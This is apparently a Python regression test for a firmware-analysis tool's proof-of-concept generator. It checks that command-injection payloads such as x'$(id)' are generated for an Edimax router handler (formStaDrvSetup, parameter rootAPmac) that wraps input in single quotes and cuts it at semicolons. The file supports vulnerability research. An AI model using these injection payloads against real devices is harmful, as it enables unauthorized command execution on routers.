"""把"读 guard 的经验"钉成测试（Edimax 那条链路的固化）。

背景：`formStaDrvSetup` 的命令是 `echo '%s' > /tmp/x`，且值在 `;` 处被截断。
所以 `;id;` 无效、`` `id` ``（不闭合引号）也无效，只有 `'$(id)'` 能打穿。
如果哪天有人把这段逻辑改回去，这些测试会立刻报警。
"""

import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from fwmap import poc  # noqa: E402

EDIMAX_GUARD = {
    "guard": ("while (*pcVar14 != ';') { *pcVar14 = '\\0' } "
              "puVar10 = \"echo '%s' > /tmp/apcli0_rootMAC\""),
    "via": "acStack_340",
}


def check(name, cond, detail=""):
    cond = bool(cond)
    print(("ok   " if cond else "FAIL ") + name + (("  " + str(detail)) if not cond else ""))
    return cond


def main() -> int:
    ok = True

    # 1) 从 guard 读出两个判据
    h = poc.guard_hints(EDIMAX_GUARD)
    ok &= check("识别出单引号包装", h["single_quoted"] is True, h)
    ok &= check("识别出分号截断", h["semicolon_cut"] is True, h)

    # 2) 载荷里必须有单引号闭合 + $()
    forms = poc.shell_payloads("id", h)
    ok &= check("有 '$(cmd)' 形态", any("$(" in f and f.startswith("x'") for f in forms), forms)
    ok &= check("没有分号形态", all(not f.startswith(";") for f in forms), forms)
    ok &= check("闭合类排在前面", forms[0].startswith("x'"), forms[:2])
    ok &= check("没有裸露的 cmd", "id" not in forms, forms)

    # 3) 没有 guard 时保留全部形态（向后兼容）
    plain = poc.shell_payloads("id")
    ok &= check("无 hints 时保留分号形态", any(f.startswith(";") for f in plain), plain)
    ok &= check("无 hints 时也有 '$(cmd)'", any("$(" in f for f in plain), plain)

    # 4) 只有单引号、没有截断的 guard：不删分号，但闭合优先
    h2 = poc.guard_hints({"guard": "sprintf(buf, \"echo '%s'\", p)"})
    ok &= check("只单引号时不判定截断", h2["semicolon_cut"] is False, h2)
    forms2 = poc.shell_payloads("id", h2)
    ok &= check("单引号时仍优先闭合", forms2[0].startswith("x'"), forms2[:2])

    # 5) build_requests 真的用了 hints
    chain = dict(EDIMAX_GUARD, function="formStaDrvSetup",
                 source_api="websGetVar", source_param="rootAPmac",
                 sink="system", sink_category="ci", sink_args="acStack_340",
                 hops=1)
    reqs = poc.build_requests(chain, cmd="id")
    body_or_value = " ".join(str(r.get("value") or r.get("body") or "") for r in reqs)
    ok &= check("生成的请求里带 '$(id)'", "$(id)" in body_or_value, body_or_value[:120])
    ok &= check("生成的请求里没有 ;id;", ";id;" not in body_or_value)

    print()
    print("PASS（guard 驱动的载荷）" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
